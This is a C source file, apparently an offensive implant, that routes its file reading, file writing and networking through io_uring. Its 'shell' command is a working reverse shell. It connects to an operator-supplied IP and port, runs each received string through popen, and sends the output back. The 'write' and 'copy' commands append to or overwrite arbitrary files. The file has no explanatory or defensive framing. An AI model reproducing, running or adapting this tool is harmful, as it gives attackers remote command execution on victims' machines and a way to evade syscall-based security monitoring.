#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <stdatomic.h>
#include <errno.h>
#include <fcntl.h>

#define RING_ENTRIES 32
#define IORING_OFF_SQ_RING 0ULL
#define IORING_OFF_CQ_RING 0x8000000ULL
#define IORING_OFF_SQES    0x10000000ULL

typedef struct {
    int      fd;
    uint32_t sq_entries;
    uint32_t cq_entries;

    char    *sq_ptr;
    size_t   sq_sz;
    _Atomic(uint32_t) *sq_tail;
    uint32_t *sq_mask;
    uint32_t *sq_array;

    char    *cq_ptr;
    size_t   cq_sz;
    _Atomic(uint32_t) *cq_head;
    _Atomic(uint32_t) *cq_tail;
    uint32_t *cq_mask;
    struct io_uring_cqe *cqes;

    struct io_uring_sqe *sqes;
    size_t   sqe_sz;

    uint64_t seq;
} Ring;

static Ring g_ring;

static int ring_setup(Ring *r)
{
    struct io_uring_params p = {};

    r->fd = (int)syscall(__NR_io_uring_setup, RING_ENTRIES, &p);
    if (r->fd < 0) { perror("io_uring_setup"); return -1; }

    r->sq_entries = p.sq_entries;
    r->cq_entries = p.cq_entries;

    r->sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    r->sq_ptr = mmap(NULL, r->sq_sz, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQ_RING);
    if (r->sq_ptr == MAP_FAILED) { perror("mmap sq"); return -1; }

    r->sq_tail  = (_Atomic(uint32_t) *)(r->sq_ptr + p.sq_off.tail);
    r->sq_mask  = (uint32_t *)(r->sq_ptr + p.sq_off.ring_mask);
    r->sq_array = (uint32_t *)(r->sq_ptr + p.sq_off.array);

    r->cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    r->cq_ptr = mmap(NULL, r->cq_sz, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_POPULATE, r->fd, (off_t)IORING_OFF_CQ_RING);
    if (r->cq_ptr == MAP_FAILED) { perror("mmap cq"); return -1; }

    r->cq_head = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.head);
    r->cq_tail = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.tail);
    r->cq_mask = (uint32_t *)(r->cq_ptr + p.cq_off.ring_mask);
    r->cqes    = (struct io_uring_cqe *)(r->cq_ptr + p.cq_off.cqes);

    r->sqe_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    r->sqes = mmap(NULL, r->sqe_sz, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { perror("mmap sqes"); return -1; }

    return 0;
}

static void ring_destroy(Ring *r)
{
    if (r->sq_ptr && r->sq_ptr != MAP_FAILED) munmap(r->sq_ptr, r->sq_sz);
    if (r->cq_ptr && r->cq_ptr != MAP_FAILED) munmap(r->cq_ptr, r->cq_sz);
    if (r->sqes   && r->sqes   != MAP_FAILED) munmap(r->sqes,   r->sqe_sz);
    if (r->fd >= 0) close(r->fd);
}

static int32_t ring_submit_wait(Ring *r, struct io_uring_sqe *sqe)
{
    uint64_t ud = ++r->seq;
    sqe->user_data = ud;

    uint32_t tail = atomic_load_explicit(r->sq_tail, memory_order_relaxed);
    uint32_t idx  = tail & *r->sq_mask;
    memcpy(&r->sqes[idx], sqe, sizeof(*sqe));
    r->sq_array[idx] = idx;
    atomic_store_explicit(r->sq_tail, tail + 1, memory_order_release);

    long entered;
    do {
        entered = syscall(__NR_io_uring_enter, r->fd, 1, 1,
                          IORING_ENTER_GETEVENTS, NULL, 0);
    } while (entered < 0 && errno == EINTR);

    for (;;) {
        uint32_t head = atomic_load_explicit(r->cq_head, memory_order_acquire);
        uint32_t ctail = atomic_load_explicit(r->cq_tail, memory_order_acquire);
        if (head == ctail) break;

        struct io_uring_cqe *cqe = &r->cqes[head & *r->cq_mask];
        int32_t res = cqe->res;
        atomic_store_explicit(r->cq_head, head + 1, memory_order_release);

        if (cqe->user_data == ud) return res;
    }
    return -EIO;
}

static int ring_openat(Ring *r, const char *path, int flags, mode_t mode)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode     = IORING_OP_OPENAT;
    sqe.fd         = AT_FDCWD;
    sqe.addr       = (uint64_t)(uintptr_t)path;
    sqe.open_flags = (uint32_t)flags;
    sqe.len        = (uint32_t)mode;
    return ring_submit_wait(r, &sqe);
}

static ssize_t ring_read(Ring *r, int fd, void *buf, size_t len, off_t off)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode = IORING_OP_READ;
    sqe.fd     = fd;
    sqe.addr   = (uint64_t)(uintptr_t)buf;
    sqe.len    = (uint32_t)len;
    sqe.off    = (uint64_t)(off < 0 ? (uint64_t)-1ULL : (uint64_t)off);
    return ring_submit_wait(r, &sqe);
}

static ssize_t ring_write(Ring *r, int fd, const void *buf, size_t len, off_t off)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd     = fd;
    sqe.addr   = (uint64_t)(uintptr_t)buf;
    sqe.len    = (uint32_t)len;
    sqe.off    = (uint64_t)(off < 0 ? (uint64_t)-1ULL : (uint64_t)off);
    return ring_submit_wait(r, &sqe);
}

static int ring_connect(Ring *r, int sockfd, struct sockaddr *addr, socklen_t addrlen)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode = IORING_OP_CONNECT;
    sqe.fd     = sockfd;
    sqe.addr   = (uint64_t)(uintptr_t)addr;
    sqe.off    = (uint64_t)addrlen;
    return ring_submit_wait(r, &sqe);
}

static ssize_t ring_send(Ring *r, int fd, const void *buf, size_t len, int flags)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode     = IORING_OP_SEND;
    sqe.fd         = fd;
    sqe.addr       = (uint64_t)(uintptr_t)buf;
    sqe.len        = (uint32_t)len;
    sqe.msg_flags  = (uint32_t)flags;
    return ring_submit_wait(r, &sqe);
}

static ssize_t ring_recv(Ring *r, int fd, void *buf, size_t len, int flags)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode    = IORING_OP_RECV;
    sqe.fd        = fd;
    sqe.addr      = (uint64_t)(uintptr_t)buf;
    sqe.len       = (uint32_t)len;
    sqe.msg_flags = (uint32_t)flags;
    return ring_submit_wait(r, &sqe);
}

static int ring_close(Ring *r, int fd)
{
    struct io_uring_sqe sqe = {};
    sqe.opcode = IORING_OP_CLOSE;
    sqe.fd     = fd;
    return ring_submit_wait(r, &sqe);
}

static void cmd_cat(const char *path)
{

    int fd = ring_openat(&g_ring, path, O_RDONLY | O_CLOEXEC, 0);
    if (fd < 0) {
        fprintf(stderr, "[!] openat '%s': %s\n", path, strerror(-fd));
        return;
    }
    char buf[4096];
    ssize_t n;
    while ((n = ring_read(&g_ring, fd, buf, sizeof(buf), -1)) > 0)
        ring_write(&g_ring, STDOUT_FILENO, buf, (size_t)n, -1);
    ring_close(&g_ring, fd);
}

static void cmd_copy(const char *src, const char *dst)
{
    int rfd = ring_openat(&g_ring, src, O_RDONLY, 0);
    if (rfd < 0) {
        fprintf(stderr, "[!] open src '%s': %s\n", src, strerror(-rfd));
        return;
    }
    int wfd = ring_openat(&g_ring, dst,
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (wfd < 0) {
        fprintf(stderr, "[!] open dst '%s': %s\n", dst, strerror(-wfd));
        ring_close(&g_ring, rfd); return;
    }
    char buf[65536];
    ssize_t n;
    size_t total = 0;
    while ((n = ring_read(&g_ring, rfd, buf, sizeof(buf), -1)) > 0) {
        ring_write(&g_ring, wfd, buf, (size_t)n, -1);
        total += (size_t)n;
    }
    ring_close(&g_ring, rfd);
    ring_close(&g_ring, wfd);
    fprintf(stderr, "[+] copied %zu bytes '%s' → '%s'\n", total, src, dst);
}

static void cmd_shell(const char *ip, int port)
{

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return; }

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    int r = ring_connect(&g_ring, sock, (struct sockaddr *)&addr, sizeof(addr));
    if (r < 0) {
        fprintf(stderr, "[!] connect %s:%d: %s\n", ip, port, strerror(-r));
        close(sock); return;
    }
    fprintf(stderr, "[+] connected to %s:%d via io_uring IORING_OP_CONNECT\n", ip, port);

    char ibuf[4096], obuf[4096];
    for (;;) {

        ssize_t nr = ring_recv(&g_ring, sock, ibuf, sizeof(ibuf) - 1, 0);
        if (nr <= 0) break;
        ibuf[nr] = '\0';

        FILE *fp = popen(ibuf, "r");
        if (!fp) {
            const char *err = "popen failed\n";
            ring_send(&g_ring, sock, err, strlen(err), 0);
            continue;
        }
        size_t total = 0;
        size_t n;
        while ((n = fread(obuf + total, 1, sizeof(obuf) - total - 1, fp)) > 0)
            total += n;
        pclose(fp);
        obuf[total] = '\0';

        if (total > 0)
            ring_send(&g_ring, sock, obuf, total, 0);
        else
            ring_send(&g_ring, sock, "(empty)\n", 8, 0);
    }
    close(sock);
}

static void cmd_write(const char *path, const char *data)
{

    int fd = ring_openat(&g_ring, path,
                         O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
        fprintf(stderr, "[!] open '%s': %s\n", path, strerror(-fd));
        return;
    }
    size_t len = strlen(data);
    ring_write(&g_ring, fd, data, len, -1);
    ring_write(&g_ring, fd, "\n", 1, -1);
    ring_close(&g_ring, fd);
    fprintf(stderr, "[+] wrote %zu bytes to '%s'\n", len, path);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <cat|write|copy|shell>\n", argv[0]);
        return 1;
    }

    if (ring_setup(&g_ring) < 0) return 1;

    if (strcmp(argv[1], "cat") == 0 && argc >= 3) {
        cmd_cat(argv[2]);
    } else if (strcmp(argv[1], "write") == 0 && argc >= 4) {
        cmd_write(argv[2], argv[3]);
    } else if (strcmp(argv[1], "copy") == 0 && argc >= 4) {
        cmd_copy(argv[2], argv[3]);
    } else if (strcmp(argv[1], "shell") == 0 && argc >= 4) {
        cmd_shell(argv[2], atoi(argv[3]));
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        ring_destroy(&g_ring);
        return 1;
    }

    ring_destroy(&g_ring);
    return 0;
}
